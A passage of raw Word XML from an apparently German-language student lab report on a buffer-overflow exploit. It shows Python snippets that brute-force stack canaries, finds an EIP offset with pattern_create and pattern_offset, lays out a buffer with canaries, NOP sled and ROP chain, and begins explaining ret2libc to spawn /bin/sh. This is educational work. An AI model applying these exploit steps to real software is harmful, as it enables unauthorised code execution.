                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = buffer + chr(canary3)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27CB33C9" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary4 = getCanary(buffer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="398E5D8B" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="25A767D4" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('Successfully got canaries:')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2246EAB0" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('--------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15A61E08" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('canary1: ' + hex(canary1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20DAE64F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('canary2: ' + hex(canary2))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08C23088" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('canary3: ' + hex(canary3))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CCC7DFE" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('canary4: ' + hex(canary4))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C0A2FAB" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="00B47CB9" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>print('--------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DD3AE60" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="00B47CB9" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6483CC67" w14:textId="1CD59170" w:rsidR="00A04F7E" w:rsidRPr="00B47CB9" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>main()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00395D28" w:rsidRPr="00B47CB9" w14:paraId="4E8BBDFD" w14:textId="77777777" w:rsidTr="00A04F7E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1402E805" w14:textId="68C64C84" w:rsidR="00395D28" w:rsidRPr="00B47CB9" w:rsidRDefault="00395D28" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Canary_3.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CC0617A" w14:textId="1A0D78A5" w:rsidR="009A6365" w:rsidRPr="00B47CB9" w:rsidRDefault="009A6365" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11DA1169" w14:textId="5D35D3BF" w:rsidR="00A710ED" w:rsidRPr="00B47CB9" w:rsidRDefault="00A710ED" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das Skript gab auf der Konsole folgendes aus:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6DB5B0" w14:textId="77777777" w:rsidR="009A6365" w:rsidRPr="00B47CB9" w:rsidRDefault="009A6365" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="374B857C" w14:textId="77777777" w:rsidR="009A6365" w:rsidRPr="00B47CB9" w:rsidRDefault="002D386D" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="758DFBF3" wp14:editId="42BEFB28">
            <wp:extent cx="5241845" cy="3045125"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="100" name="Grafik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242958" cy="3045772"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BDC0E6" w14:textId="6D798FF0" w:rsidR="009A6365" w:rsidRPr="00B47CB9" w:rsidRDefault="009A6365" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B93CE84" w14:textId="3547495D" w:rsidR="009A6365" w:rsidRPr="00B47CB9" w:rsidRDefault="00A710ED" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Es konnten also folgende canaries ermittelt werden:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD6463C" w14:textId="59513048" w:rsidR="00A710ED" w:rsidRPr="00B47CB9" w:rsidRDefault="00A710ED" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AB614BF" w14:textId="7B8B9A3A" w:rsidR="00A710ED" w:rsidRPr="008E2D33" w:rsidRDefault="00A710ED" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t xml:space="preserve">Canary1 = </w:t>
      </w:r>
      <w:r w:rsidR="00837D63" w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>0xbc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A8AD50" w14:textId="57C1C206" w:rsidR="00837D63" w:rsidRPr="008E2D33" w:rsidRDefault="00837D63" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>Canary2 = 0xad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3D40EA" w14:textId="4703EC6B" w:rsidR="00837D63" w:rsidRPr="008E2D33" w:rsidRDefault="00837D63" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>Canary3 = 0xb8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0F787A" w14:textId="128AABA7" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00837D63" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Canary4 = 0xa8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3574DB8B" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F173192" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Um überprüfen zu können, an welcher Stelle das EIP Register überschrieben wird generiete ich mit pattern_create ein Pattern (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D59239" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7757428F" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2255A692" wp14:editId="4AE3F77F">
            <wp:extent cx="5759450" cy="422275"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="121" name="Grafik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59450" cy="422275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A16E71" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7116E70C" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Diese fügte ich nach 128 a’s und den canaries der Variable Buffer hinzu. In der folgenden Ansicht ist der Auszug aus dem Skript ersichtlich.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w14:paraId="4F4CEE0A" w14:textId="77777777" w:rsidTr="00CE0758">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16AABD2F" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>…</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F287770" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E7AC27A" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>canaries = '\xbc\xad\xb8\xa8'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0683A468" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>buffer = "A" * 128 + canaries + pattern</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0346D458" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>…</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w14:paraId="3057ECC4" w14:textId="77777777" w:rsidTr="00CE0758">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5554C6B5" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00CE0758">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Pattern.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3822DAF8" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C3725AD" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das EIP Register wurde mit dem Wert 37614136 überschrieben. Dies übergab ich dem Tool pattern_offset und erhielt 20 als Offset.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAD1F8F" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EA09641" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="269A8F6A" wp14:editId="127CABE7">
            <wp:extent cx="5759450" cy="590550"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="124" name="Grafik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59450" cy="590550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B10545" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F23F0BF" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Daher war meine Idee, dass der Buffer schlussendlich wie folgt ausschauen sollte:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D7B091" w14:textId="77777777" w:rsidR="00F8563A" w:rsidRPr="00B47CB9" w:rsidRDefault="00F8563A" w:rsidP="00F8563A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5258D875" w14:textId="29FA31AE" w:rsidR="00F8563A" w:rsidRPr="008E2D33" w:rsidRDefault="00F8563A" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>Buffer = 128 * a + canaries (4 byte) + fillernopsleds (20 byte) + ropchain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A69FC5" w14:textId="77777777" w:rsidR="009A6365" w:rsidRPr="008E2D33" w:rsidRDefault="009A6365" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60592697" w14:textId="39044DDB" w:rsidR="00B54F9F" w:rsidRPr="00B47CB9" w:rsidRDefault="00825AD9" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Als nächstes überlegt</w:t>
      </w:r>
      <w:r w:rsidR="006B321F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich mir,</w:t>
      </w:r>
      <w:r w:rsidR="00B54F9F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006B321F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wie ich nun etwas auf dem Zielsystem ausführen soll.</w:t>
      </w:r>
      <w:r w:rsidR="00F55AF4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ich erinnerte mich, dass in der Vorlesung erwähnt wurde, dass wir uns </w:t>
      </w:r>
      <w:r w:rsidR="006432A8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Return to Libc anschauen sollten und ich schaute mir an, um was es sich bei diesem Begriff handelt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752B8DEB" w14:textId="22F05587" w:rsidR="00854D93" w:rsidRPr="00B47CB9" w:rsidRDefault="00854D93" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A55ACCB" w14:textId="769CE8A7" w:rsidR="00825AD9" w:rsidRPr="00B47CB9" w:rsidRDefault="00BC06B0" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Idee hinter ret2libc ist, dass </w:t>
      </w:r>
      <w:r w:rsidR="00DF1630" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>man,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> statt in einer Anwendung Shellcode einzufügen und </w:t>
      </w:r>
      <w:r w:rsidR="00DF1630" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dann an die Adresse des Shellcodes zu springen</w:t>
      </w:r>
      <w:r w:rsidR="00A72DC1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, Funktionen verwendet, welche in der C </w:t>
      </w:r>
      <w:r w:rsidR="006B0AD7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Library </w:t>
      </w:r>
      <w:r w:rsidR="00A72DC1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">vorhanden sind. </w:t>
      </w:r>
      <w:r w:rsidR="00D94A2B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das kann beispielsweise ein Aufruf der Funktion System sein, um </w:t>
      </w:r>
      <w:r w:rsidR="0086046B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">/bin/sh auszuführen. Darüber hinaus benötigt man die Funktionen exit(), um </w:t>
      </w:r>
      <w:r w:rsidR="00121CBD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das Programm </w:t>
      </w:r>
      <w:r w:rsidR="00591DB1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>sauber zu beenden.</w:t>
      </w:r>
      <w:r w:rsidR="00E85441" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#4ff3cceb-b05d-42fe-adaa-42e62beb3c86"/>
          <w:id w:val="-714734626"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00E67D32" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00E67D32" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
